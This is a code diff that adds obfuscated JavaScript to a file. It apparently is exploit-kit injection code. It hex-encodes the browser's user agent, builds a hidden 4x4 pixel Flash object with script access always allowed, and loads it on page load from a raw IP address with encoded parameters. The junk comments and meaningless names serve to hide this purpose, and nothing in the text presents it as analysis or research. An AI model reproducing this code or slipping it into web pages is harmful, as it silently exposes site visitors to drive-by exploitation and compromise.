@@ -1,0 +1,23 @@
+/*s28569d19900hssfj2976fs*/function hgfgerdfgdf(num, width){/*s59978d3968hfj33988fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s43066d85034hfj89644fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s79726d39024hfj42281fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s49210d35395hfj75253fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd70750hfs*/c += b + d;/*s22836d26611hfj90353fs*/e += 1;}return c;}/*s48552dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://188.225.76.66/?MjYwMjc4OTY=&slim=OMZQhC_peURrA_2lz3yrARcZ0lwhSC6zRSxOgbUwwSswgWnazKHqPMrBNxUEBmUATIfpwhoxrAVSXrND9ygPWLQjl0m-_G9P91lJUd1F2qgA1_&tweaks=MzM3NTk5OTU=&new=x3_Qd_WdaR2PCIjCM_ndTKFEMU3OHEeJwY-fmbDTF5-oeTaiz7GSEhzy6V-tSDvQgfFOLLZRIgGyjxqCOQc0neFcEFhK9f6skEOVyE6ewJay_E&around=MzA3OTM3Mg==", ghnvbn("http://188.225.76.66/?MzkwMTU0OQ==&new=x3zQd_WeaR6PCIjBM_ndT6FHMU7OH0eKwY-fmbDTF5yoeTahz7GSEhzx6V-tSzvQgfFOLLZSIgKyjBqCOQc0neFcEFtK9v6vkEOVyE6dwJay_0&tweaks=MTYyNjQ1MDQ=&slim=OMZQtC_peXRrA_2lz3yrARcp0lwheC6DRRxOsbUwwSswsWnazKHqDMrxNxUENmUwTLfp8hoBrDVSXrND9xgPWLQTh3n-_K9_V1m5Yd10Ophw4q&before=NDI5OTMwMjk=","gexywoaxor"));
